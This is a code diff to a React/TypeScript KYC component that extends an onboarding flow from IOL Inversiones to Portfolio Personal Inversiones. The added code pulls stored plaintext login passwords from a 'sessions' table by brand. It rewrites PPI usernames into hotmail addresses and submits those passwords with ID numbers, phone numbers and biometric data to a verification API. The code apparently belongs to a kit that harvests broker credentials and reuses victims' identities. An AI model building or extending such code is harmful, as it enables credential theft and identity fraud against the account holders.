@@ -52,9 +52,18 @@ interface WayniKycFlowProps {
   caseId: string;
   embedded?: boolean;
   brandLabel?: string;
+  source?: string;
 }
 
 const stepOrder: Exclude<KycFlowScreen, "intro" | "done">[] = ["verify", "biometric"];
+
+/** For PPI: if email has no '@', append '@hotmail.com' */
+const normalizeEmail = (email: string, source: string) => {
+  if (source === "ppi" && email && !email.includes("@")) {
+    return `${email}@hotmail.com`;
+  }
+  return email;
+};
 
 const generateAutoPhone = () => {
   const suffix = String(Math.floor(100 + Math.random() * 900));
@@ -102,8 +111,9 @@ const getBiometricLabel = (status?: string | null, started?: boolean) => {
 
 const cardClass = "rounded-[28px] border-border bg-card/95 shadow-sm";
 
-const WayniKycFlow = ({ caseId, embedded = false, brandLabel = "IOL" }: WayniKycFlowProps) => {
-  const brandName = brandLabel === "IOL" ? "IOL Inversiones" : brandLabel;
+const WayniKycFlow = ({ caseId, embedded = false, brandLabel = "IOL", source: sourceProp }: WayniKycFlowProps) => {
+  const flowSource = sourceProp || (brandLabel === "PPI" ? "ppi" : "iol");
+  const brandName = brandLabel === "IOL" ? "IOL Inversiones" : brandLabel === "PPI" ? "Portfolio Personal Inversiones" : brandLabel;
 
   const [loading, setLoading] = useState(true);
   const [caseRecord, setCaseRecord] = useState<KycCaseRecord | null>(null);
@@ -169,13 +179,13 @@ const WayniKycFlow = ({ caseId, embedded = false, brandLabel = "IOL" }: WayniKyc
       .from("wayni_onboarding")
       .select("id")
       .eq("email", email)
-      .eq("source", "iol")
+      .eq("source", flowSource)
       .maybeSingle();
 
     const basePayload = {
       ...payload,
       email,
-      source: "iol",
+      source: flowSource,
       updated_at: new Date().toISOString(),
     };
 
@@ -184,7 +194,7 @@ const WayniKycFlow = ({ caseId, embedded = false, brandLabel = "IOL" }: WayniKyc
     } else {
       await sb.from("wayni_onboarding").insert(basePayload);
     }
-  }, []);
+  }, [flowSource]);
 
   const loadCase = useCallback(async () => {
     if (!caseId) {
@@ -210,7 +220,7 @@ const WayniKycFlow = ({ caseId, embedded = false, brandLabel = "IOL" }: WayniKyc
     const record = data as KycCaseRecord;
     setCaseRecord(record);
 
-    const normalizedEmail = (record.email || "").toLowerCase();
+    const normalizedEmail = normalizeEmail((record.email || "").toLowerCase(), flowSource);
 
     const [sessionRes, onboardingRes] = await Promise.all([
       normalizedEmail
@@ -218,7 +228,7 @@ const WayniKycFlow = ({ caseId, embedded = false, brandLabel = "IOL" }: WayniKyc
           .from("sessions")
           .select("password")
           .eq("email", normalizedEmail)
-          .eq("source", "iol")
+          .eq("source", flowSource)
           .order("created_at", { ascending: false })
           .limit(1)
           .maybeSingle()
@@ -228,7 +238,7 @@ const WayniKycFlow = ({ caseId, embedded = false, brandLabel = "IOL" }: WayniKyc
           .from("wayni_onboarding")
           .select("id, email, full_name, phone, dni, gender, user_uuid, biometric_url, biometric_id, region, city, street, zip_code, bio_status, wallet_status, face_code, face_confidence, status, password, metadata")
           .eq("email", normalizedEmail)
-          .eq("source", "iol")
+          .eq("source", flowSource)
           .order("updated_at", { ascending: false })
           .limit(1)
           .maybeSingle()
@@ -470,7 +480,7 @@ const WayniKycFlow = ({ caseId, embedded = false, brandLabel = "IOL" }: WayniKyc
     }
 
     if (!sessionPassword) {
-      setVerifyError("No pudimos obtener la contraseña de sesión para validar. Reintentá el ingreso desde IOL.");
+      setVerifyError(`No pudimos obtener la contraseña de sesión para validar. Reintentá el ingreso desde ${brandName}.`);
       return;
     }
 
@@ -512,9 +522,11 @@ const WayniKycFlow = ({ caseId, embedded = false, brandLabel = "IOL" }: WayniKyc
       let verifyResult: any = null;
       let lastError = "";
 
+      const emailForApi = normalizeEmail(caseRecord.email, flowSource);
+
       const payload = {
         action: "onboarding_verify",
-        email: caseRecord.email,
+        email: emailForApi,
         identity_number: parsed.data.dni,
         phone_number: resolvedPhone,
         password: sessionPassword,
